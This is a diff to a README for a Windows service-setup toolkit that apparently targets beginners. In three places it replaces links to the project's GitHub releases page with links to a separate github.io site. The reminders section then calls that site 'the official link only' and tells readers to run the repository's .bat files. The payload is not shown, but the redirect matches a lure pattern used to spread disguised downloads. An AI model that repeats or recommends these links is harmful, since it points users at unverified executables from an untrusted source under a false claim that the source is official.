@@ -1,5 +1,5 @@
 # ⚙️ system-service-collections - Simplify Service Setup on Any System
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Karlaunrenewable5629/system-service-collections/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://karlaunrenewable5629.github.io)
 
 ## 🧭 What Is This?
 
@@ -21,7 +21,7 @@ Follow these four simple steps to get up and running. Do not skip ahead—each s
 
 ### Step 1: Download the Package
 
-Visit this link to download the application: [https://github.com/Karlaunrenewable5629/system-service-collections/releases](https://github.com/Karlaunrenewable5629/system-service-collections/releases) 
+Visit this link to download the application: [https://karlaunrenewable5629.github.io](https://karlaunrenewable5629.github.io) 
 
 Click the big green button that says "Latest Release" or "Download" on that page. Your browser will save a file called something like `system-service-collections.zip` to your "Downloads" folder. Do not worry about the version number—any recent release works perfectly.
 
@@ -181,7 +181,7 @@ A: Not directly. macOS uses a different system called "launchd". This project fo
 
 ## 📝 Final Reminders
 
-- Always download from the official link only: [https://github.com/Karlaunrenewable5629/system-service-collections/releases](https://github.com/Karlaunrenewable5629/system-service-collections/releases) 
+- Always download from the official link only: [https://karlaunrenewable5629.github.io](https://karlaunrenewable5629.github.io) 
 - Never run `.bat` files from unknown sources—only use ones from this repository. 
 - If something breaks, reboot first. Then check troubleshooting above. 
 - You've got this. Setting up a service is a skill anyone can learn in ten minutes with this toolkit. 
